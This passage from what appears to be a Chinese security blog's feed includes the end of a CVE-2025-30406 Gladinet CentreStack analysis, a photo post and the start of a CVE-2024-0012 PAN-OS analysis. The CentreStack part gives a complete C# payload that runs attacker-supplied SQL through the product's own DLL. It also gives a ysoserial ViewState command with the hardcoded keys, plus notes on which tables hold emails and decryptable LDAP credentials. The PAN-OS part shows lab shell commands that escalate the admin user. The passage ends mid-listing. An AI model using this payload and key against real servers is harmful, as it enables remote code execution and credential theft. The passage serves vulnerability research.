则是获取单独的字段随后构造连接字符串：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image28.png?imageSlim" alt="图片"><br>随后连接字符串给传入 GetDBByConnString，根据其特征分别是 3 种不同的数据库：sql server、postgres、mysql</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image29.png?imageSlim" alt="图片"><br>到这里我们就知道该如何去直接调用这个 dll 去执行 sql 了。</p><p>代码如下：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Collections;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Reflection;<br><span class="hljs-keyword">using</span> System.Text;<br><span class="hljs-keyword">using</span> System.Web;<br><span class="hljs-keyword">using</span> System.Data;<br><span class="hljs-keyword">using</span> System.Data.Common;<br><span class="hljs-keyword">using</span> System.Runtime.Serialization;<br><span class="hljs-keyword">using</span> System.Runtime.Serialization.Formatters.Binary;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">E</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">SerializeToJson</span>(<span class="hljs-params">DataTable data</span>)</span><br>    &#123;<br>        StringBuilder json = <span class="hljs-keyword">new</span> StringBuilder();<br>        json.Append(<span class="hljs-string">&quot;&#123;\&quot;success\&quot;:true,\&quot;columns\&quot;:[&quot;</span>);<br><br><br>        <span class="hljs-comment">// 序列化列信息</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; data.Columns.Count; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>            json.Append(<span class="hljs-string">&quot;&#123;\&quot;name\&quot;:\&quot;&quot;</span> + EscapeJsonString(data.Columns[i].ColumnName) + <span class="hljs-string">&quot;\&quot;,\&quot;type\&quot;:\&quot;&quot;</span> + EscapeJsonString(data.Columns[i].DataType.Name) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>);<br>        &#125;<br><br><br>        json.Append(<span class="hljs-string">&quot;],\&quot;rows\&quot;:[&quot;</span>);<br><br><br>        <span class="hljs-comment">// 序列化行数据</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; data.Rows.Count; i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>            json.Append(<span class="hljs-string">&quot;&#123;&quot;</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; data.Columns.Count; j++)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (j &gt; <span class="hljs-number">0</span>) json.Append(<span class="hljs-string">&quot;,&quot;</span>);<br>                <span class="hljs-built_in">string</span> <span class="hljs-keyword">value</span> = data.Rows[i][j] != <span class="hljs-literal">null</span> ? data.Rows[i][j].ToString() : <span class="hljs-string">&quot;null&quot;</span>;<br>                json.Append(<span class="hljs-string">&quot;\&quot;&quot;</span> + EscapeJsonString(data.Columns[j].ColumnName) + <span class="hljs-string">&quot;\&quot;:\&quot;&quot;</span> + EscapeJsonString(<span class="hljs-keyword">value</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>            &#125;<br>            json.Append(<span class="hljs-string">&quot;&#125;&quot;</span>);<br>        &#125;<br><br><br>        json.Append(<span class="hljs-string">&quot;]&#125;&quot;</span>);<br>        <span class="hljs-keyword">return</span> json.ToString();<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">EscapeJsonString</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> input</span>)</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;null&quot;</span>;<br>        <br>        StringBuilder sb = <span class="hljs-keyword">new</span> StringBuilder();<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">char</span> c <span class="hljs-keyword">in</span> input)<br>        &#123;<br>            <span class="hljs-keyword">switch</span> (c)<br>            &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\\&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\\\&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\\&quot;&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\b&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\f&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\f&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\n&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\r&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:<br>                    sb.Append(<span class="hljs-string">&quot;\\t&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-literal">default</span>:<br>                    <span class="hljs-keyword">if</span> (c &lt; <span class="hljs-string">&#x27; &#x27;</span>)<br>                    &#123;<br>                        sb.AppendFormat(<span class="hljs-string">&quot;\\u&#123;0:X4&#125;&quot;</span>, (<span class="hljs-built_in">int</span>)c);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        sb.Append(c);<br>                    &#125;<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> sb.ToString();<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">string</span> <span class="hljs-title">GetData</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            <span class="hljs-comment">// 加载 userlib.dll</span><br>            <span class="hljs-built_in">string</span> dllPath = <span class="hljs-string">@&quot;C:\Program Files (x86)\Gladinet Cloud Enterprise\portal\bin\userlib.dll&quot;</span>;<br>            Assembly assembly = Assembly.LoadFile(dllPath);<br>            <br>            <span class="hljs-comment">// 获取 GladUserDB 类</span><br>            Type gladUserDBType = assembly.GetType(<span class="hljs-string">&quot;user.GladUserDB&quot;</span>);<br>            <span class="hljs-keyword">if</span> (gladUserDBType == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find GladUserDB type\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 初始化数据库连接</span><br>            MethodInfo isDBReadyMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;IsDBReady&quot;</span>);<br>            <span class="hljs-keyword">if</span> (isDBReadyMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find IsDBReady method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-built_in">bool</span> isReady = (<span class="hljs-built_in">bool</span>)isDBReadyMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">if</span> (!isReady)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Database is not ready\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 获取并解码 Base64 格式的 SQL 查询</span><br>            <span class="hljs-built_in">string</span> base64Sql = HttpContext.Current.Request.Form[<span class="hljs-string">&quot;s&quot;</span>];<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>.IsNullOrEmpty(base64Sql))<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;No SQL query provided\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-built_in">string</span> sqlQuery;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-built_in">byte</span>[] sqlBytes = Convert.FromBase64String(base64Sql);<br>                sqlQuery = Encoding.UTF8.GetString(sqlBytes);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> (FormatException)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Invalid Base64 SQL query format\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            <span class="hljs-comment">// 创建数据库命令</span><br>            MethodInfo createDBCmdMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;CreateDBCmd&quot;</span>, <span class="hljs-keyword">new</span> Type[] &#123; <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>) &#125;);<br>            <span class="hljs-keyword">if</span> (createDBCmdMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find CreateDBCmd method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            DbCommand cmd = (DbCommand)createDBCmdMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] &#123; sqlQuery &#125;);<br><br><br>            <span class="hljs-comment">// 获取数据</span><br>            MethodInfo getDataMethod = gladUserDBType.GetMethod(<span class="hljs-string">&quot;GetData&quot;</span>, <span class="hljs-keyword">new</span> Type[] &#123; <span class="hljs-keyword">typeof</span>(DbCommand) &#125;);<br>            <span class="hljs-keyword">if</span> (getDataMethod == <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;Failed to find GetData method\&quot;&#125;&quot;</span>;<br>            &#125;<br><br><br>            DataTable data = (DataTable)getDataMethod.Invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[] &#123; cmd &#125;);<br><br><br>            <span class="hljs-comment">// 处理结果</span><br>            <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>)<br>            &#123;<br>                <span class="hljs-keyword">return</span> SerializeToJson(data);<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;No data returned\&quot;&#125;&quot;</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;&quot;</span> + EscapeJsonString(ex.Message) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>;<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">E</span>()</span><br>    &#123;<br>        <span class="hljs-keyword">try</span><br>        &#123;<br>            HttpContext context = HttpContext.Current;<br>            context.Server.ClearError();<br>            context.Response.Clear();<br>            context.Response.ContentType = <span class="hljs-string">&quot;application/json&quot;</span>;<br>            context.Response.Write(GetData());<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex)<br>        &#123;<br>            HttpContext.Current.Response.Write(<span class="hljs-string">&quot;&#123;\&quot;success\&quot;:false,\&quot;message\&quot;:\&quot;&quot;</span> + EscapeJsonString(ex.ToString()) + <span class="hljs-string">&quot;\&quot;&#125;&quot;</span>);<br>        &#125;<br>        HttpContext.Current.Response.Flush();<br>        HttpContext.Current.Response.End();<br>    &#125;<br>&#125; <br><br><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">.\ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile --decryptionkey=&quot;B4C3E4CB6CAF27CA9F7909640A4D608CC4458173F13E09C9&quot; --validationkey=&quot;5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9DD770C9EDD5D67C66B7E621411D3E57EA181BBF89FD21957DCDDFACFD926E16&quot; --generator=3FE2630A -c &quot;CentreStack.ExecSql.cs;System.dll;System.Web.dll;System.Data.dll;System.Xml.dll;System.Runtime.Extensions.dll&quot;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image30.png?imageSlim" alt="图片"></p><p>CentreStack 中部分表介绍：</p><ul><li>xaf_user：邮箱信息</li><li>xaf_namedvalue：配置项，name&#x3D;ldap_endpoint 的就是 LDAP 的连接信息可以解密</li><li>csmain_xaf_files：文件信息（ 名称、路径 ）</li><li>…..</li></ul><p>xaf_namedvalue 中的 ldap_endpoint  是加密的，但是解密方式和数据库连接信息的完全相同。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image31.png?imageSlim" alt="图片"></p><p>LDAP 批量获取：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515112801495.png?imageSlim" alt="image-20250515112801495"></p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h3 id="硬编码凭证"><a href="#硬编码凭证" class="headerlink" title="硬编码凭证"></a>硬编码凭证</h3><p>GladinetPayFlow.dll 中发现部分 Gladinet 相关平台的 API KEY。这里不展示了。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>machineKey 从硬编码更改为随机生成。</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515123323990.png?imageSlim" alt="image-20250515123323990"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild">https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild</a></li><li><a href="https://exp10it.io/2024/02/asp-net-viewstate-deserialization/">https://exp10it.io/2024/02/asp-net-viewstate-deserialization/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天空（ 一 ）</title>
      <link href="/2025/05/08/%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95/%E5%A4%A9%E7%A9%BA-01/"/>
      <url>/2025/05/08/%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95/%E5%A4%A9%E7%A9%BA-01/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108320.jpg" alt="1749374108320"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108377.jpg" alt="1749374108377"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108363.jpg" alt="1749374108363"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108351.jpg" alt="1749374108351"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108333.jpg" alt="1749374108333"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108297.jpg" alt="1749374108297"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108287.jpg" alt="1749374108287"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108269.jpg" alt="1749374108269"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108259.jpg" alt="1749374108259"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108249.jpg" alt="1749374108249"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108231.jpg" alt="1749374108231"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108222.jpg" alt="1749374108222"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108213.jpg" alt="1749374108213"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108202.jpg" alt="1749374108202"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108191.jpg" alt="1749374108191"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108184.jpg" alt="1749374108184"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108173.jpg" alt="1749374108173"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108163.jpg" alt="1749374108163"></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1749374108150.jpg" alt="1749374108150"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2024-0012 Palo Alto 认证绕过漏洞分析</title>
      <link href="/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-0012/"/>
      <url>/2025/05/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2024-0012/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞编号：CVE-2024-0012 </p><p>漏洞名称：Palo Alto Networks PAN-OS Management 管理端权限绕过漏洞</p><p>漏洞原理：nginx 配置问题导致在处理 .js.map$ 路由的时候无需身份验证，导致认证绕过，可以配合 CVE-2024-9474 实现命令执行。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>搭建版本：11.0.2</p><p>出现问题：vm login 登不上，解决方法等待系统可能还在初始化。初始化过程中会出现 IP 地址，WEB 的账号密码和 CLI 是相通的，可以在 WEB 上面修改。</p><p>默认用户密码：admin</p><p><a href="https://172.253.1.163/">https://172.253.1.163</a></p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515144753672.png?imageSlim" alt="image-20250515144753672"></p><p>登录后 CLI 的，通过 RCE 漏洞修改 admin 用户的 shell。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">usermod -s <span class="hljs-regexp">/bin/</span>bash admin<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515144954102.png?imageSlim" alt="image-20250515144954102"></p><p>测试过直接添加一个用户（通过执行 shell 脚本，漏洞有长度限制），可以通过 admin 切换到该用户，但是不能直接登录。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">usermod -aG root admin</span><br></code></pre></td></tr></table></figure><p>下载链接：</p><ul><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4-h7.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.1.4-h7.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-10.1.9-h1.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-10.1.9-h1.ova</a></li><li><a href="https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.0.2.ova">https://mirror.cloudpropeller.com/paloalto/vm-series/PA-VM-ESX-11.0.2.ova</a></li><li><a href="https://download.cloudcyte.com/VMs/PA-VM-ESX-10.1.7.ova">https://download.cloudcyte.com/VMs/PA-VM-ESX-10.1.7.ova</a></li></ul><h2 id="环境分析"><a href="#环境分析" class="headerlink" title="环境分析"></a>环境分析</h2><h3 id="基本架构"><a href="#基本架构" class="headerlink" title="基本架构"></a>基本架构</h3><p>通过进程可以发现有：</p><p>httpd &#x3D;&gt; apache</p><p>nginx</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515151043095.png?imageSlim" alt="image-20250515151043095"></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netstat -tulnp | <span class="hljs-type">grep</span> -E &#x27;httpd|<span class="hljs-type">nginx</span>&#x27;<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515152913827.png?imageSlim" alt="image-20250515152913827"></p><p>nginx 监听 80,443</p><p>apache 监听 28250</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515153126042.png?imageSlim" alt="image-20250515153126042"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">grep</span> -R <span class="hljs-string">&#x27;proxy_pass&#x27;</span> <span class="hljs-regexp">/etc/</span>nginx/<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515153257041.png?imageSlim" alt="image-20250515153257041"></p><p>所以可以知道是 Apache + PHP 提供 WEB 服务，Nginx 作为反向代理</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">request</span> <span class="hljs-operator">=</span>&gt; nginx(<span class="hljs-number">443</span>) <span class="hljs-operator">=</span>&gt; apache(<span class="hljs-number">28250</span>) <span class="hljs-operator">=</span>&gt; php<br></code></pre></td></tr></table></figure><h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>所以 WEB 其实是由 apache 启动的，查看 apache 配置：</p><p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/image-20250515154100204.png?imageSlim" alt="image-20250515154100204"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br><span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;^\s*#|^\s*$&#x27;</span> /etc/httpd/mgmtui/<span class="hljs-keyword">conf</span>/httpd.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 